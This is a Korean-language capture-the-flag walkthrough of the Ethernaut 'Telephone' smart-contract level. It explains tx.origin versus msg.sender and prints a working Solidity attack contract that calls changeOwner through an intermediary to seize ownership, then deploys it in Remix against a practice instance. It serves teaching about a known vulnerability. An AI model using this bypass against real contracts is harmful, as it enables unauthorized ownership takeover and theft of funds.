https://honey-push-30b.notion.site/Ethernaut-Telephone-589e6a0e3fce47b6b984daee74fbb3a1
![telephone.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3f4ea603-baa7-46e6-819d-caa0fb883f03/telephone.png)

> 
> 
> 
> 이번 문제를 해결하기 위해서는
> 
> 1. 컨트랙트의 Ownership을 얻으세요 
> 
> 힌트
> 
> - 개발자 도구 콘솔에서 help() 명령어를 사용해 보세요.

코드는 아래와 같다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

코드가 상당히 간단해서 무엇을 해야 할지가 명확하다. tx.origin과 msg.sender가 같지 않게 하여 owner를 우리가 원하는 주소(나의 메타마스크 주소)로 변경시켜주면 된다.

# 코드 분석 및 공격 설계

이번 문제의 목적은 owner 권한을 얻는 것이며 owner 권한을 얻기 위해서는 tx.origin과 msg.sender가 다르게 하여 changeOwner 함수를 호출해주면 된다.

이를 위해서는 tx.origin과 msg.sender가 어떤 의미인지 짚어봐야 한다.

### EOA(External Owned Account)와 CA(Contract Account)

EOA(External Owned Account)는 공개 이더리움 주소와 개인키 조합을 의미하는데 쉽게 말해 지갑 주소라고 보면 된다. 이것을 이용하여 다른 계정과 이더리움을 송수신하고 스마트 컨트랙트에 트랜잭션을 보낼 수 있다. 메타마스크, 카이카스와 같은 지갑에서 만든 계정이 EOA다.

CA(Contract Account)는 컨트랙트 계정을 의미하는데 외부 소유 계정과 다르게 개인키가 존재하지 않고, 스마트 컨트랙트를 블록체인에 배포할 때 생성된다. 컨트랙트 계정 대신 컨트랙트로만 표시하기도 한다. 즉 컨트랙트를 짜서 컨트랙트에 요청을 보내게 되면 CA를 통해 컨트랙트의 함수를 실행할 수 있다.

### tx.origin과 msg.sender

스마트 컨트랙트 코드를 우리 지갑의 주소(EOA)에서 트랜잭션을 발생시킬 수 있다. 이 때 tx.origin은 이 트랜잭션을 발생시키는 내 지갑주소(EOA)를 의미한다. 하지만 이경우 msg.sender는 현재 컨트랙트를 호출한 주소를 의미한다. 즉 msg.sender는 지갑주소(EOA)가 될수도 있고 컨트랙트 주소(CA)가될수도 있다.

즉 글로벌 변수 tx.origin은 트랜잭션의 발신자(호출의 첫번째 발신자)를 의미하고 msg.sender는 자신을 호출한 주소를 의미한다. 

따라서 owner 권한을 얻기 위해서는 컨트랙트 코드를 통해 Telephone의 changeOwner함수를 실행시키면 tx.origin은 내 지갑주소,msg.sender는 Telephone을 호출한 컨트랙트 주소가 되므로 tx.origin ! = msg.sender 조건을 통과하고 owner 권한을 내가 원하는 주소로 변경할 수 있다.

따라서 Telephone 컨트랙트의 changeOwner를 호출하는 컨트랙트 코드를 작성해보자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelAttack {
    Telephone public telephone;
    constructor(address _teladdr) public{
        telephone = Telephone(_teladdr);
    }
    function attack(address _addr) public {
        telephone.changeOwner(_addr);
    }
}
```

Telephone 컨트랙트를 받아서 changeOwner 함수를 호출하되 내가 원하는 주소를 매개변수로 넘겨줄 수 있도록 공격 코드를 작성하였다. 

# 공격

먼저 get new instance를 통해 인스턴스를 생성하자.

![get new instance.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/43886706-6988-416d-9703-e22b753ec20a/get_new_instance.png)

트랜잭션을 허용해주어 인스턴스가 생성된 후에 인스턴스 주소를 확인하자.

![instance 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da45480b-ae07-4377-b98d-331530a9b87c/instance_%EC%A3%BC%EC%86%8C.png)

인스턴스 주소는 0x9f87048d24684531460c799ce920A631d11cc091 로 되어있는 것을 확인할 수 있다.

![level.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa1fb3be-45f4-4fee-a458-e5e545c4afeb/level.png)

level 컨트랙트에서 우리 문제 인스턴스를 만들었기 때문에 owner가 msg.sender임을 알 수 있고 이 owner 값을 바꾸기 위해서 changeOwner 함수를 호출하는 컨트랙트를 Remix에서 작성하자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelAttack {
    Telephone public telephone;
    constructor(address _teladdr) public{
        telephone = Telephone(_teladdr);
    }
    function attack(address _addr) public {
        telephone.changeOwner(_addr);
    }
}

```

코드는 Telephone 컨트랙트 코드를 복사한 뒤 TelAttack 컨트랙트를 생성하여 내부에서 Telephone 컨트랙트를 받을 telephone 변수를 선언하고 생성자(constructor)를 통해 배포할 때 넣어준 Telephone 인스턴스 주소값으로 telephone 변수에 컨트랙트를 저장해준다.

그리고 attack 함수를 통해 내 메타마스크 주소를 파라미터로 넣어주어 telephone 컨트랙트의 changeOwner 함수를 호출하여 owner 권한을 얻어낼 것이다.

![TelephoneAttack.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa898b23-3998-424b-9d45-e82daf58db12/TelephoneAttack.png)

컨트랙트 폴더에 새롭게 TelephoneAttack.sol 파일을 만들고 코드를 입력해준다. 

![compile.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b127da8f-cafc-4cba-bc23-d2ddc9ed3794/compile.png)

TelephoneAttack.sol 파일을 컴파일 해준다.

![Deploy.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a992fc89-92c6-4334-89bf-845df80363b6/Deploy.png)

그리고 배포할때 생성자로 instance의 주소를 넣어주어 이 컨트랙트가 Telephone instance에 접근할 수 있도록 해준다.

![컨트랙트 배포끝.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26c4e7f7-7651-488a-845d-cc9592c93888/%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8_%EB%B0%B0%ED%8F%AC%EB%81%9D.png)

배포하고 나면 이제 attack 함수를 실행할 수 있는데 이 함수를 실행하기 위해서는 owner가 될 주소가 필요하다. 우리 player의 주소로 설정해주자.

![내 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14fb89ca-b61c-416a-a6d4-79fd0b053cb7/%EB%82%B4_%EC%A3%BC%EC%86%8C.png)

개발자 도구 콘솔에서 player 명령어를 통해 player의 주소는'0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a’ 임을 확인할 수 있다.

![공격.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4ce6e56-8c2a-4a15-a989-8dbfc9d12a62/%EA%B3%B5%EA%B2%A9.png)

이제 내 주소를 입력해주고 공격을 해보자. 트랜잭션을 허용해주면 컨펌이 뜬다.

 

![공격 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8b3b5912-ae17-410c-bee2-9d987fdbe61c/%EA%B3%B5%EA%B2%A9_%EC%84%B1%EA%B3%B5.png)

공격 함수가 컨펌이 되고 나서 컨트랙트의 owner가 정상적으로 내 주소로 바뀌었음을 확인할 수 있다. 이제 owner 권한을 얻었으므로 instance를 제출하면 개발자 도구 콘솔에서 클리어 했음을 알 수 있다.

 

![클리어.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ca958b94-8fdb-4a79-9d29-69825062b54d/%ED%81%B4%EB%A6%AC%EC%96%B4.png)

클리어 성공!
